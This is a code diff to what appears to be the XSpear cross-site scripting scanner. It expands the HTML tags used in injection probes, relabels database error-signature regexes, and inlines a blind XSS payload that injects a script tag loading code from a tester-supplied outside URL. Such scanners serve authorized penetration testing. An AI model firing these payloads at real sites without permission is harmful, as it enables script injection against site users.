@@ -69,7 +69,7 @@ class XspearScan
         puts '[I]'.blue + " [#{time.strftime('%H:%M:%S')}] reflected #{@query}"
         [false, true]
       else
-        [false, false]
+        [false, "Not reflected #{@query}"]
       end
     end
   end
@@ -80,7 +80,6 @@ class XspearScan
         # Server header
         @report.add_issue("i","s","-","-","original query","Found Server: #{@response['Server']}")
       end
-
 
       if @response['Strict-Transport-Security'].nil?
         # HSTS
@@ -130,28 +129,28 @@ class XspearScan
     def run
       info = "Found"
       if @response.body.to_s.match(/(SQL syntax.*MySQL|Warning.*mysql_.*|MySqlException \(0x|valid MySQL result|check the manual that corresponds to your (MySQL|MariaDB) server version|MySqlClient\.|com\.mysql\.jdbc\.exceptions)/i)
-        info = info + "MYSQL "
+        info = info + "MYSQL Error"
       end
       if @response.body.to_s.match(/(Driver.* SQL[\-\_\ ]*Server|OLE DB.* SQL Server|\bSQL Server.*Driver|Warning.*mssql_.*|\bSQL Server.*[0-9a-fA-F]{8}|[\s\S]Exception.*\WSystem\.Data\.SqlClient\.|[\s\S]Exception.*\WRoadhouse\.Cms\.|Microsoft SQL Native Client.*[0-9a-fA-F]{8})/i)
-        info = info + "MSSQL "
+        info = info + "MSSQL Error"
       end
       if @response.body.to_s.match(/(\bORA-\d{5}|Oracle error|Oracle.*Driver|Warning.*\Woci_.*|Warning.*\Wora_.*)/i)
-        info = info + "Oracle "
+        info = info + "Oracle Error"
       end
       if @response.body.to_s.match(/(PostgreSQL.*ERROR|Warning.*\Wpg_.*|valid PostgreSQL result|Npgsql\.|PG::SyntaxError:|org\.postgresql\.util\.PSQLException|ERROR:\s\ssyntax error at or near)/i)
-        info = info + "Postgres "
+        info = info + "Postgres Error"
       end
       if @response.body.to_s.match(/(Microsoft Access (\d+ )?Driver|JET Database Engine|Access Database Engine|ODBC Microsoft Access)/i)
-        info = info + "MSAccess "
+        info = info + "MSAccess Error"
       end
       if @response.body.to_s.match(/(SQLite\/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|\[SQLITE_ERROR\])/i)
-        info = info + "SQLite "
+        info = info + "SQLite Error"
       end
       if @response.body.to_s.match(/(Warning.*sybase.*|Sybase message|Sybase.*Server message.*|SybSQLException|com\.sybase\.jdbc)/i)
-        info = info + "SyBase "
+        info = info + "SyBase Error"
       end
       if @response.body.to_s.match(/(Warning.*ingres_|Ingres SQLSTATE|Ingres\W.*Driver)/i)
-        info = info + "Ingress "
+        info = info + "Ingress Error"
       end
 
       if info.length > 5
@@ -302,7 +301,17 @@ class XspearScan
     ]
     tags = [
         "script",
-        "iframe"
+        "iframe",
+        "svg",
+        "img",
+        "video",
+        "audio",
+        "meta",
+        "object",
+        "embeded",
+        "style",
+        "frame",
+        "frameset"
     ]
     special_chars =[
         ">",
@@ -333,7 +342,7 @@ class XspearScan
     r.push makeQueryPattern('r', 'rEfe6', 'rEfe6', 'i', 'reflected parameter', CallbackStringMatch)
     # Check Special Char
     special_chars.each do |sc|
-      r.push makeQueryPattern('f', "XsPeaR#{sc}>", "XsPeaR#{sc}", 'i', "not filtered "+"#{sc}".blue, CallbackNotAdded)
+      r.push makeQueryPattern('f', "#{sc}XsPeaR", "#{sc}XsPeaR", 'i', "not filtered "+"#{sc}".blue, CallbackNotAdded)
     end
 
     # Check Event Handler
@@ -361,8 +370,8 @@ class XspearScan
 
     # Check Blind XSS Payload
     if !@blind_url.nil?
-      payload = "<script src=#{@blind_url}></script>"
-      r.push makeQueryPattern('f', "\"'>#{payload}", "NOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "NOTDETECTED", 'i', "", CallbackNotAdded)
+
     end
 
     r = r.flatten
@@ -418,7 +427,6 @@ class XspearScan
       else
         result.push("inject": 'body',"param":"STATIC" ,"type": type, "query": @url, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
       end
-      p result
     else
       uri = URI.parse(@url)
       begin
